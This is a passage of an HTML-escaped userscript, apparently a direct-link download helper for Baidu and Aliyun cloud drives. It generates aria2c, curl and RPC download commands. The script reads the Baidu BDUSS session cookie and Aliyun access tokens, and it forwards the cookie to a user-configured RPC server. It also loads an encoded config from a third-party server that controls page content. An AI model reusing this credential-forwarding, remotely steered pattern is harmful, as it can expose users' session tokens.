&#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); document.documentElement.addEventListener(&#x27;mouseup&#x27;, (e) =&gt; &#123; if (e.target.nodeName === &#x27;A&#x27; &amp;&amp; ~e.target.className.indexOf(&#x27;pl-a&#x27;)) &#123; e.stopPropagation(); &#125; &#125;, true); &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;g-dropdown-button pointer pl-button&quot;&gt;&lt;div style=&quot;color:#fff;background: $&#123;color&#125;;border-color:$&#123;color&#125;&quot; class=&quot;g-button g-button-blue&quot;&gt;&lt;span class=&quot;g-button-right&quot;&gt;&lt;em class=&quot;icon icon-download&quot;&gt;&lt;/em&gt;&lt;span class=&quot;text&quot; style=&quot;width: 60px;&quot;&gt;下载助手&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;menu&quot; style=&quot;width:auto;z-index:41;border-color:$&#123;color&#125;&quot;&gt;&lt;div style=&quot;color:$&#123;color&#125;&quot; class=&quot;g-button-menu pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/div&gt;&lt;div style=&quot;color:$&#123;color&#125;&quot; class=&quot;g-button-menu pl-button-mode&quot; data-mode=&quot;aria&quot;&gt;Aria下载&lt;/div&gt;&lt;div style=&quot;color:$&#123;color&#125;&quot; class=&quot;g-button-menu pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/div&gt;&lt;div style=&quot;color:$&#123;color&#125;&quot; class=&quot;g-button-menu pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/div&gt;&lt;div style=&quot;color:$&#123;color&#125;&quot; class=&quot;g-button-menu pl-button-mode&quot; data-mode=&quot;bc&quot;&gt;BC下载&lt;/div&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/div&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) $toolWrap = $(pan.btn.home); if (pt === &#x27;main&#x27;) &#123; $toolWrap = $(pan.btn.main); $button = $(`&lt;div class=&quot;pl-button&quot; style=&quot;position: relative; display: inline-block; margin-right: 8px;&quot;&gt;&lt;button class=&quot;u-button u-button--primary u-button--small is-round is-has-icon&quot; style=&quot;background: $&#123;color&#125;;border-color: $&#123;color&#125;;font-size: 14px; padding: 8px 16px; border: none;&quot;&gt;&lt;i class=&quot;u-icon u-icon-download&quot;&gt;&lt;/i&gt;&lt;span&gt;下载助手&lt;/span&gt;&lt;/button&gt;&lt;ul class=&quot;dropdown-list nd-common-float-menu pl-dropdown-menu&quot;&gt;&lt;li class=&quot;sub cursor-p pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;sub cursor-p pl-button-mode&quot; data-mode=&quot;aria&quot;&gt;Aria下载&lt;/li&gt;&lt;li class=&quot;sub cursor-p pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;sub cursor-p pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;sub cursor-p pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.newX : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); &#125; if (pt === &#x27;share&#x27;) $toolWrap = $(pan.btn.share); $toolWrap.prepend($button); this.setBDUSS(); this.addPageListener(); &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;g-dropdown-button pointer pl-button-init&quot; style=&quot;opacity:.5&quot;&gt;&lt;div style=&quot;color:#fff;background: $&#123;color&#125;;border-color:$&#123;color&#125;&quot; class=&quot;g-button g-button-blue&quot;&gt;&lt;span class=&quot;g-button-right&quot;&gt;&lt;em class=&quot;icon icon-download&quot;&gt;&lt;/em&gt;&lt;span class=&quot;text&quot; style=&quot;width: 60px;&quot;&gt;下载助手&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) $toolWrap = $(pan.btn.home); if (pt === &#x27;main&#x27;) &#123; $toolWrap = $(pan.btn.main); $button = $(`&lt;div class=&quot;pl-button-init&quot; style=&quot;opacity:.5; display: inline-block; margin-right: 8px;&quot;&gt;&lt;button class=&quot;u-button u-button--primary u-button--small is-round is-has-icon&quot; style=&quot;background: $&#123;color&#125;;border-color: $&#123;color&#125;;font-size: 14px; padding: 8px 16px; border: none;&quot;&gt;&lt;i class=&quot;u-icon u-icon-download&quot;&gt;&lt;/i&gt;&lt;span&gt;下载助手&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`); &#125; if (pt === &#x27;share&#x27;) $toolWrap = $(pan.btn.share); $toolWrap.prepend($button); $button.click(() =&gt; base.initDialog()); &#125;, async getPCSLink() &#123; selectList = this.getSelectedList(); let fidList = this._getFidList(), url, res; if (pt === &#x27;home&#x27; || pt === &#x27;main&#x27;) &#123; if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (fidList.length === 2) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; fidList = encodeURIComponent(fidList); url = `$&#123;pan.pcs[0]&#125;&amp;fsids=$&#123;fidList&#125;`; res = await base.get(url, &#123;&quot;User-Agent&quot;: pan.ua&#125;); &#125; if (pt === &#x27;share&#x27;) &#123; this.getShareData(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (fidList.length === 2) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; if (!params.sign) &#123; let url = `$&#123;pan.pcs[2]&#125;&amp;surl=$&#123;params.surl&#125;&amp;logid=$&#123;params.logid&#125;`; let r = await base.get(url); if (r.errno === 0) &#123; params.sign = r.data.sign; params.timestamp = r.data.timestamp; &#125; else &#123; let dialog = await Swal.fire(&#123; toast: true, icon: &#x27;info&#x27;, title: `提示：请将文件&lt;span class=&quot;tag-danger&quot;&gt;[保存到网盘]&lt;/span&gt;👉前往&lt;span class=&quot;tag-danger&quot;&gt;[我的网盘]&lt;/span&gt;中下载！`, showConfirmButton: true, confirmButtonText: &#x27;点击保存&#x27;, position: &#x27;top&#x27;, &#125;); if (dialog.isConfirmed) &#123; $(&#x27;.tools-share-save-hb&#x27;)[0].click(); &#125; return; &#125; &#125; if (!params.bdstoken) &#123; return message.error(&#x27;提示：请先登录网盘！&#x27;); &#125; let formData = new FormData(); formData.append(&#x27;encrypt&#x27;, params.encrypt); formData.append(&#x27;product&#x27;, params.product); formData.append(&#x27;uk&#x27;, params.uk); formData.append(&#x27;primaryid&#x27;, params.primaryid); formData.append(&#x27;fid_list&#x27;, fidList); formData.append(&#x27;logid&#x27;, params.logid); params.shareType === &#x27;secret&#x27; ? formData.append(&#x27;extra&#x27;, params.extra) : &#x27;&#x27;; url = `$&#123;pan.pcs[1]&#125;&amp;sign=$&#123;params.sign&#125;&amp;timestamp=$&#123;params.timestamp&#125;`; res = await base.post(url, formData, &#123;&quot;User-Agent&quot;: pan.ua&#125;); &#125; if (res.errno === 0) &#123; let html = this.generateDom(res.list); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125; else if (res.errno === 112) &#123; return message.error(&#x27;提示：页面过期，请刷新重试！&#x27;); &#125; else &#123; message.error(&#x27;提示：获取下载链接失败！请刷新网页后重试！&#x27;); &#125; &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; base.sortByName(list); list.forEach((v, i) =&gt; &#123; if (v.isdir === 1) return; let filename = v.server_filename || v.filename; let ext = base.getExtension(filename); let size = base.sizeFormat(v.size); let dlink = v.dlink; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a listener-link-api&quot; href=&quot;$&#123;dlink&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;div class=&quot;pl-item-tip&quot; style=&quot;display: none&quot;&gt;&lt;span&gt;若没有弹出IDM下载框，找到IDM &lt;b&gt;选项&lt;/b&gt; -&gt; &lt;b&gt;文件类型&lt;/b&gt; -&gt; &lt;b&gt;第一个框&lt;/b&gt; 中添加后缀 &lt;span class=&quot;pl-ext&quot;&gt;$&#123;ext&#125;&lt;/span&gt;，&lt;a href=&quot;$&#123;pan.idm&#125;&quot; target=&quot;_blank&quot; class=&quot;pl-a&quot;&gt;详见此处&lt;/a&gt;&lt;/span&gt; &lt;span class=&quot;pl-back listener-back&quot;&gt;返回&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;pl-item-progress&quot; style=&quot;display: none&quot;&gt; &lt;div class=&quot;pl-progress&quot;&gt; &lt;div class=&quot;pl-progress-outer&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pl-progress-inner&quot; style=&quot;width:5%&quot;&gt; &lt;div class=&quot;pl-progress-inner-text&quot;&gt;0%&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;span class=&quot;pl-progress-stop listener-stop&quot;&gt;取消下载&lt;/span&gt; &lt;span class=&quot;pl-progress-tip&quot;&gt;未发现IDM，使用自带浏览器下载&lt;/span&gt; &lt;span class=&quot;pl-progress-how listener-how&quot;&gt;如何唤起IDM？&lt;/span&gt; &lt;/div&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, pan.ua); if (typeof (alink) === &#x27;object&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a&quot; target=&quot;_blank&quot; href=&quot;$&#123;alink.link&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink.link&#125;&quot;&gt;$&#123;decodeURIComponent(alink.text)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; else &#123; alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, pan.ua); if (typeof (alink) === &#x27;object&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a&quot; target=&quot;_blank&quot; href=&quot;$&#123;alink.link&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink.link&#125;&quot;&gt;$&#123;decodeURIComponent(alink.text)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; else &#123; alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, pan.ua); console.log(alink); if (typeof (alink) === &#x27;object&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a&quot; target=&quot;_blank&quot; href=&quot;$&#123;alink.link&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink.link&#125;&quot;&gt;$&#123;decodeURIComponent(alink.text)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; else &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link pl-a&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let BDUSS = this.getBDUSS(); if (!BDUSS) return &#x27;assistant&#x27;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [`User-Agent: $&#123;pan.ua&#125;`, `Cookie: BDUSS=$&#123;BDUSS&#125;`] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&quot;User-Agent&quot;: pan.ua&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; return require(&#x27;system-core:context/context.js&#x27;).instanceForSystem.list.getSelected(); &#125; catch (e) &#123; return document.querySelector(&#x27;.wp-s-core-pan&#x27;).__vue__.selectedList; &#125; &#125;, getLogid() &#123; let ut = require(&quot;system-core:context/context.js&quot;).instanceForSystem.tools.baseService; return ut.base64Encode(base.getCookie(&quot;BAIDUID&quot;)); &#125;, getShareData() &#123; let res = locals.dump(); params.shareType = &#x27;secret&#x27;; params.sign = &#x27;&#x27;; params.timestamp = &#x27;&#x27;; params.bdstoken = res.bdstoken.value; params.channel = &#x27;chunlei&#x27;; params.clienttype = 0; params.web = 1; params.app_id = 250528; params.encrypt = 0; params.product = &#x27;share&#x27;; params.logid = this.getLogid(); params.primaryid = res.shareid.value; params.uk = res.share_uk.value; params.shareType === &#x27;secret&#x27; &amp;&amp; (params.extra = this._getExtra()); params.surl = this._getSurl(); &#125;, detectPage() &#123; let path = location.pathname; if (/^\\/disk\\/home/.test(path)) return &#x27;home&#x27;; if (/^\\/disk\\/main/.test(path)) return &#x27;main&#x27;; if (/^\\/(s|share)\\//.test(path)) return &#x27;share&#x27;; return &#x27;&#x27;; return &#x27;&#x27;; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;).then(() =&gt; &#123; this._resetData(); &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); base.createTip(); base.registerMenuCommand(); &#125; &#125;; let ali = &#123; convertLinkToAria(link, filename, ua) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot; --header &quot;Referer: https://www.aliyundrive.com/&quot;`); &#125;, convertLinkToBC(link, filename, ua) &#123; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;&amp;refer=$&#123;encodeURIComponent(&#x27;https://www.aliyundrive.com/&#x27;)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125;, convertLinkToCurl(link, filename, ua) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot; -e &quot;https://www.aliyundrive.com/&quot;`); &#125;, addPageListener() &#123; doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); let dataset = e.currentTarget.dataset; let href = dataset.link; let url = await this.getRealLink(dataset.did, dataset.fid); if (url) href = url; let d = document.createElement(&quot;a&quot;); d.download = e.currentTarget.dataset.filename; d.rel = &quot;noopener&quot;; d.href = href; d.dispatchEvent(new MouseEvent(&quot;click&quot;)); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === &#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); &#125;, async getRealLink(d, f) &#123; let authorization = `$&#123;base.getStorage(&#x27;token&#x27;).token_type&#125; $&#123;base.getStorage(&#x27;token&#x27;).access_token&#125;`; let res = await base.post(pan.pcs[1], &#123; drive_id: d, file_id: f &#125;, &#123; authorization, &quot;content-type&quot;: &quot;application/json;charset=utf-8&quot;, &#125;); if (res.url) &#123; return res.url; &#125; return &#x27;&#x27;; &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;ali-button pl-button&quot;&gt;&lt;svg viewBox=&quot;0 0 1024 1024&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;16&quot; height=&quot;16&quot;&gt;&lt;path d=&quot;M853.333 938.667H170.667a85.333 85.333 0 0 1-85.334-85.334v-384A85.333 85.333 0 0 1 170.667 384H288a32 32 0 0 1 0 64H170.667a21.333 21.333 0 0 0-21.334 21.333v384a21.333 21.333 0 0 0 21.334 21.334h682.666a21.333 21.333 0 0 0 21.334-21.334v-384A21.333 21.333 0 0 0 853.333 448H736a32 32 0 0 1 0-64h117.333a85.333 85.333 0 0 1 85.334 85.333v384a85.333 85.333 0 0 1-85.334 85.334z&quot; fill=&quot;#fff&quot;/&gt;&lt;path d=&quot;M715.03 543.552a32.81 32.81 0 0 0-46.251 0L554.005 657.813v-540.48a32 32 0 0 0-64 0v539.734L375.893 543.488a32.79 32.79 0 0 0-46.229 0 32.427 32.427 0 0 0 0 46.037l169.557 168.811a32.81 32.81 0 0 0 46.251 0l169.557-168.81a32.47 32.47 0 0 0 0-45.974z&quot; fill=&quot;#FF9C00&quot;/&gt;&lt;/svg&gt;&lt;span&gt;下载助手&lt;/span&gt;&lt;ul class=&quot;pl-dropdown-menu&quot;&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;aria&quot; &gt;Aria下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.append($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; base.createDownloadIframe(); this.addPageListener(); &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;ali-button pl-button-init&quot;&gt;&lt;svg viewBox=&quot;0 0 1024 1024&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;16&quot; height=&quot;16&quot;&gt;&lt;path d=&quot;M853.333 938.667H170.667a85.333 85.333 0 0 1-85.334-85.334v-384A85.333 85.333 0 0 1 170.667 384H288a32 32 0 0 1 0 64H170.667a21.333 21.333 0 0 0-21.334 21.333v384a21.333 21.333 0 0 0 21.334 21.334h682.666a21.333 21.333 0 0 0 21.334-21.334v-384A21.333 21.333 0 0 0 853.333 448H736a32 32 0 0 1 0-64h117.333a85.333 85.333 0 0 1 85.334 85.333v384a85.333 85.333 0 0 1-85.334 85.334z&quot; fill=&quot;#fff&quot;/&gt;&lt;path d=&quot;M715.03 543.552a32.81 32.81 0 0 0-46.251 0L554.005 657.813v-540.48a32 32 0 0 0-64 0v539.734L375.893 543.488a32.79 32.79 0 0 0-46.229 0 32.427 32.427 0 0 0 0 46.037l169.557 168.811a32.81 32.81 0 0 0 46.251 0l169.557-168.81a32.47 32.47 0 0 0 0-45.974z&quot; fill=&quot;#FF9C00&quot;/&gt;&lt;/svg&gt;&lt;span&gt;下载助手&lt;/span&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.append($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; $button.click(() =&gt; base.initDialog()); &#125;, async getPCSLink() &#123; let reactDomGrid = document.getElementsByClassName(pan.dom.grid)[0]; if (reactDomGrid) &#123; let res = await Swal.fire(&#123; title: &#x27;提示&#x27;, html: &#x27;&lt;div style=&quot;display: flex;align-items: center;justify-content: center;&quot;&gt;请先切换到 &lt;b&gt;列表视图&lt;/b&gt;（&lt;svg class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;16&quot; height=&quot;16&quot;&gt;&lt;path d=&quot;M132 928c-32.8 0-59.2-26.4-59.2-59.2s26.4-59.2 59.2-59.2h760c32.8 0 59.2 26.4 59.2 59.2S924.8 928 892 928H132zm0-356.8c-32.8 0-59.2-26.4-59.2-59.2s26.4-59.2 59.2-59.2h760c32.8 0 59.2 26.4 59.2 59.2s-26.4 59.2-59.2 59.2H132zm0-356c-32.8 0-59.2-26.4-59.2-59.2S99.2 96.8 132 96.8h760c32.8 0 59.2 26.4 59.2 59.2s-26.4 59.2-59.2 59.2H132z&quot;/&gt;&lt;/svg&gt;）后获取！&lt;/div&gt;&#x27;, confirmButtonText: &#x27;点击切换&#x27; &#125;); if (res) &#123; $(&#x27;.switch-wrapper--1yEfx&#x27;).trigger(&#x27;click&#x27;); return message.success(&#x27;切换成功，请重新获取下载链接！&#x27;); &#125; return false; &#125; selectList = this.getSelectedList(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (this.isOnlyFolder()) &#123; return 